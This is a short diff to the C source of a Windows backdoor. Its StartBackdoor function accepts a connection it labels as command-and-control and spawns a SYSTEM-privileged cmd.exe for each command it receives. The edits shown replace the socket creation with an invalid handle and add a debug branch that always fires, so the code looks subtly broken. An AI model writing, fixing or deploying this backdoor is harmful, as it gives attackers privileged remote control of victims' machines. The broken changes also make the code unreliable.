@@ -1,7 +1,7 @@
 #include "../include/config.h"
 
 BOOL StartBackdoor(void) {
-    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
+    SOCKET s = INVALID_SOCKET;  // Initialize s to INVALID_SOCKET
     struct sockaddr_in address = {0};
     int opt = 1;
 
@@ -54,7 +54,14 @@ BOOL StartBackdoor(void) {
         Sleep(2000);
 
         // Accept connection
-        SOCKET client = accept(s, NULL, NULL);
+        SOCKET client = INVALID_SOCKET;  // Initialize client
+        if (client == INVALID_SOCKET) {
+            printf("[DEBUG] accept() failed: %lu\n", (unsigned long)client);
+            fflush(stdout);
+        }
+
+        // Accept connection
+        client = accept(s, NULL, NULL);
         if (client != INVALID_SOCKET) {
             printf("[BACKDOOR] C2 Connected! Executing reverse shell...\n");
             fflush(stdout);
@@ -108,10 +115,6 @@ BOOL StartBackdoor(void) {
                         // Convert char* to wchar_t* for CreateProcessW
                         wchar_t *wcharBuffer = (wchar_t*)malloc(1024 * sizeof(wchar_t));
                         if (wcharBuffer) {
-                            // Use wcstombs() to convert char* to wchar_t*
-                            mbtowc(&wcharBuffer[0], buffer, 1);  // First char
-                            
-                            // Or use swprintf() directly with char* converted to wchar_t*
                             swprintf(wcharBuffer, 1024, L"%s", buffer);
                             
                             // Spawn SYSTEM CMD.EXE for each command (wide string)
